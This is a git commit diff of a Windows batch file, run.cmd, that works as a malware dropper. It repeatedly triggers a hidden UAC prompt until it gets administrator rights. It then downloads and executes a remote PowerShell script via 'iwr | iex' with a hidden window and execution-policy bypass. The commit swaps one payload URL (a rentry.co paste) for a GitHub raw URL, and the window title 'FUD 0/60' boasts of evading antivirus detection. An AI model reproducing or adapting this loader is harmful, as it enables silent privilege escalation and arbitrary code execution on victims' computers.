4483f408c9d099eae8966865bf0a333703f62285
43a1723 <hai1723notgay@gmail.com>
2024-07-25 17:31:12 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -2,6 +2,6 @@
 cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-powershell -w hidden -nop -ep bypass -c "iwr -useb https://rentry.co/q3pm6zhu/raw | iex"
+
 powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
 title FUD 0/60
